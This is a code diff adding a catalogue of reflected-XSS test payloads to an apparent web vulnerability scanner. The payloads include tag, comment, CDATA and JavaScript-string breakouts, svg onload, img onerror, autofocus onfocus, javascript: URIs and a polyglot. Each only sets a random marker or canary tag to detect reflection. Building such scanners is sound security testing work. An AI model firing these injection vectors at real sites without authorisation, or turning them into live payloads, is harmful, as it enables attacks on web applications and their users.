@@ -16,12 +16,58 @@ from modules.active_probe_base import ActiveProbeBase
 
 SEVERITY_RANK = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "INFO": 0}
 
+# XSS payload catalogue. Each entry sets up a different context-breakout so the
+# reflection classifier can promote it from "text_reflection" up to script_context
+# or html_attribute when the reflected output proves a real sink. The `{marker}`
+# placeholder is the per-run random token used to verify reflection.
+# Sourced from PayloadsAllTheThings/XSS Injection.
 DEFAULT_PAYLOADS = [
+    # Plain marker — used to learn baseline reflection / escape behaviour.
     ("plain_marker", "{marker}"),
+
+    # Classic attribute & tag-breakouts using the <reconx-xss> canary tag so the
+    # html_tag classifier fires when the tag survives in the response body.
     ("double_quote_html", '"><reconx-xss data-rxss="{marker}"></reconx-xss>'),
     ("single_quote_html", "'><reconx-xss data-rxss='{marker}'></reconx-xss>"),
     ("script_breakout", '</script><reconx-xss data-rxss="{marker}"></reconx-xss>'),
     ("attribute_marker", '" data-rxss="{marker}'),
+
+    # HTML comment breakout — apps that wrap user input in <!-- ... --> for templating
+    # need a `-->` to escape the comment context first.
+    ("html_comment_breakout", '--><reconx-xss data-rxss="{marker}"></reconx-xss><!--'),
+
+    # CDATA breakout (XHTML / XML-like contexts).
+    ("cdata_breakout", ']]><reconx-xss data-rxss="{marker}"></reconx-xss><![CDATA['),
+
+    # SVG-based event handler. `<svg onload=...>` survives many HTML sanitisers that
+    # only blacklist <script>. The marker is in the attribute payload so the
+    # classifier's _inside_tag check fires (MEDIUM).
+    ("svg_onload", '<svg/onload="window.name=\'{marker}\'"><reconx-xss data-rxss="{marker}"></reconx-xss></svg>'),
+
+    # IMG onerror — fires on any broken src. One of the highest-success XSS vectors.
+    ("img_onerror", '<img src=x onerror="window.name=\'{marker}\'"><reconx-xss data-rxss="{marker}"></reconx-xss>'),
+
+    # JS string-literal breakout (double-quoted). Marker reflects inside <script>...
+    # so _inside_script promotes to HIGH script_context_reflection.
+    ("js_string_dq", '";reconx_rxss="{marker}";//'),
+
+    # JS string-literal breakout (single-quoted).
+    ("js_string_sq", "';reconx_rxss='{marker}';//"),
+
+    # ES6 template-literal breakout (backtick contexts).
+    ("js_template_literal", '`${{reconx_rxss=\'{marker}\'}}`'),
+
+    # Attribute-value breakout without needing tag close — works inside `value="…"`
+    # contexts. Uses `autofocus` to trigger `onfocus` without user interaction.
+    ("attr_event_breakout", '" autofocus onfocus="window.name=\'{marker}\'" data-rxss="{marker}'),
+
+    # `javascript:` URI scheme — for params reflected into href/src (e.g. open redirect
+    # styles where the value lands inside an anchor href).
+    ("javascript_scheme", 'javascript:/*--></title></style></textarea></script><reconx-xss data-rxss="{marker}"></reconx-xss>'),
+
+    # Polyglot — collapses HTML / JS / attribute breakouts into one string. Famous
+    # 0xsobky-style polyglot, adapted to drop the <reconx-xss> canary at the end.
+    ("polyglot", "javascript:`/*'/*\"/*--></noscript></style></title></textarea></script><reconx-xss data-rxss=\"{marker}\"></reconx-xss>"),
 ]
 
 
